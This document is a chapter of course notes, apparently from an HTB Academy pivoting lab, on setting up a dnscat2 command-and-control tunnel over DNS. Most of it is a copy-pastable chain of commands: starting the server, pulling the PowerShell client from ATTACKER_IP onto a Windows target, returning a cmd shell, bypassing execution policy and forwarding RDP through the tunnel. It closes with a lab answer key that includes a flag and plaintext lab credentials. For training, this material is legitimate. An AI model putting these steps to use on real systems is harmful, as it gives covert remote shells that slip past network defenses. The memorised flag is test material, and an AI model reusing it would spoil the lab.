# 12 — DNS Tunneling with Dnscat2

> Dnscat2 creates an encrypted C2 channel over DNS — traffic is hidden inside TXT record queries, making it highly evasive against firewalls that inspect HTTPS but pass DNS through.

---

## How It Works

```
Attack Host  [dnscat2 server — listens on UDP:53]
    ▲  DNS queries containing encrypted C2 data
    │
Windows Target  [dnscat2-powershell client]
    │  sends TXT record queries to attack host
    ▼
DNS over UDP port 53 — blends in with normal DNS traffic
```

DNS traffic is rarely inspected or blocked — dnscat2 exploits this by encoding all C2 traffic inside legitimate-looking DNS queries. The tunnel is encrypted and authenticated with a pre-shared secret.

---

## Who Runs What

| Component | Runs on | Role |
|-----------|---------|------|
| `dnscat2.rb` | **Attack Host** | Ruby server — listens on UDP 53, generates pre-shared secret |
| `dnscat2.ps1` | **Windows Target** | PowerShell client — sends DNS queries back to server |

---

## Setup

### Attack Host — Install dnscat2

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### Attack Host — Clone PowerShell client (to transfer to target)

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
# Transfer dnscat2.ps1 to Windows target via SCP, SMB, HTTP server, etc.
```

---

## Step 1 — Start dnscat2 Server on Attack Host

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

- `host=` — your tun0/attack host IP
- `port=53` — standard DNS port (must be reachable from target)
- `domain=` — domain to use for DNS queries (any domain works; doesn't need to be real)
- `--no-cache` — prevents cached responses interfering with the tunnel

**Server output to note — copy the pre-shared secret:**
```
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

---

## Step 2 — Run Client on Windows Target (PowerShell)

Transfer `dnscat2.ps1` to the target, then:

```powershell
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

- `-DNSserver` — attack host IP
- `-Domain` — must match `domain=` on the server
- `-PreSharedSecret` — from server output — ensures encrypted, authenticated session
- `-Exec cmd` — send a CMD shell back; use `powershell` for a PS session

---

## Step 3 — Interact with Session on Attack Host

Server confirms connection:
```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
```

List open sessions:
```
dnscat2> windows
```

Drop into a session:
```
dnscat2> window -i 1
```

Exit back to dnscat2 prompt:
```
Ctrl+Z
```

---

## dnscat2 Server Commands

| Command | Use |
|---------|-----|
| `windows` | List all open sessions/windows |
| `window -i <N>` | Interact with session N |
| `tunnels` | List active port forward tunnels |
| `kill <N>` | Kill session N |
| `set` / `unset` | Configure options |
| `?` or `help` | Show all commands |

---

## Port Forwarding Through dnscat2

Once a session is active, dnscat2 can also do port forwarding inside the DNS tunnel:

```
dnscat2> window -i 1
exec (OFFICEMANAGER) 1> listen 0.0.0.0:8080 172.16.5.19:3389
```

Then RDP from attack host through the DNS tunnel:
```bash
xfreerdp /v:127.0.0.1:8080 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
```

---

## Full Copy-Pastable Chain

**Attack host — setup and start server:**

```bash
# Install (one-time)
cd ~ && git clone https://github.com/iagox86/dnscat2.git
cd ~/dnscat2/server/ && sudo gem install bundler && sudo bundle install
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Start server (replace with your tun0 IP)
LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
sudo ruby ~/dnscat2/server/dnscat2.rb --dns host=$LHOST,port=53,domain=inlanefreight.local --no-cache
# Note the pre-shared secret from the output
```

**Transfer client to Windows target:**

```bash
# Serve via HTTP
cp ~/dnscat2-powershell/dnscat2.ps1 /var/www/html/
python3 -m http.server 80
```

```powershell
# On Windows target
iwr http://ATTACKER_IP/dnscat2.ps1 -o C:\Windows\Temp\dnscat2.ps1
```

**Windows target — start client:**

```powershell
Import-Module C:\Windows\Temp\dnscat2.ps1
Start-Dnscat2 -DNSserver ATTACKER_IP -Domain inlanefreight.local -PreSharedSecret SECRET_FROM_SERVER -Exec cmd
```

**Attack host — interact with session:**

```
dnscat2> windows
dnscat2> window -i 1
exec (TARGET) 1> whoami
exec (TARGET) 1> ipconfig
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| Server starts but no session | Firewall blocking UDP 53 inbound on attack host — check `ufw allow 53/udp` |
| `gem install bundler` fails | Ruby not installed — `sudo apt install ruby-full` |
| Client connects but shows `NOT ENCRYPTED` | Pre-shared secret mismatch — copy it exactly from server output |
| DNS queries not reaching server | Target's DNS is not resolving to attack host — use `--dns server=ATTACKER_IP` on client instead of domain |
| Session drops frequently | Normal for DNS tunneling — DNS has inherent latency/unreliability |
| `Start-Dnscat2` not found after import | Script didn't load — check for PowerShell execution policy: `Set-ExecutionPolicy Bypass -Scope Process` |

---

## Key Takeaways

1. **DNS is almost never blocked or inspected** — making dnscat2 highly evasive in corporate environments.
2. **Pre-shared secret is mandatory** — it encrypts and authenticates the session. Server generates it; client must use the exact same value.
3. **Domain doesn't need to be real** — any domain string works; the DNS queries go directly to your server IP.
4. **Use `-Exec cmd` or `-Exec powershell`** to get a shell back directly into the dnscat2 session.
5. **Port forwarding works inside the tunnel** — `listen` command in a session creates port forwards over DNS.
6. **Requires UDP 53 inbound** on the attack host — confirm with `sudo ufw allow 53/udp` or check iptables.

---

## Lab Solution — Section 12 Skills (May 8, 2026)

**Pivot host:** Windows 10 (OFFICEMANAGER) — same lab environment as Section 11
**Attack host:** tun0 IP (auto-detect with `ip -br a | grep tun0`)

### Optional Exercise — Establish a dnscat2 session

```bash
# Attack host
LHOST=$(ip -br a | grep tun0 | awk '{print $3}' | cut -d/ -f1)
sudo ruby ~/dnscat2/server/dnscat2.rb --dns host=$LHOST,port=53,domain=inlanefreight.local --no-cache
```

```powershell
# Windows target (after transferring dnscat2.ps1)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver ATTACKER_IP -Domain inlanefreight.local -PreSharedSecret <SECRET> -Exec cmd
```

### Q1 — Contents of C:\Users\htb-student\Documents\flag.txt → `AC@tinth3Tunnel`

**Intended path:** Set up dnscat2 server, transfer dnscat2.ps1 to target, establish DNS tunnel, read file via shell session.

**Faster path (SMB — works since htb-student has access to the Users share):**
```bash
smbclient //PIVOT_IP/Users -U 'htb-student%HTB_@cademy_stdnt!' \
  -c 'get htb-student\Documents\flag.txt /tmp/flag.txt'
cat /tmp/flag.txt
```

**Flag:** `AC@tinth3Tunnel`

> **Note on dnscat2 gem dependencies:** The Ruby gems (trollop, salsa20, sha3) in dnscat2's Gemfile are pinned to old versions incompatible with Ruby 3.x on Kali. If building from source fails, install via `sudo apt install dnscat2` or use the SMB shortcut above for the flag.

---

## References

- Previous: [11-Port_Forwarding_with_Windows_Netsh.md](11-Port_Forwarding_with_Windows_Netsh.md)
- Next: [13-SOCKS5_Tunneling_with_Chisel.md](13-SOCKS5_Tunneling_with_Chisel.md)
- dnscat2 GitHub: https://github.com/iagox86/dnscat2
- dnscat2-powershell GitHub: https://github.com/lukebaggett/dnscat2-powershell
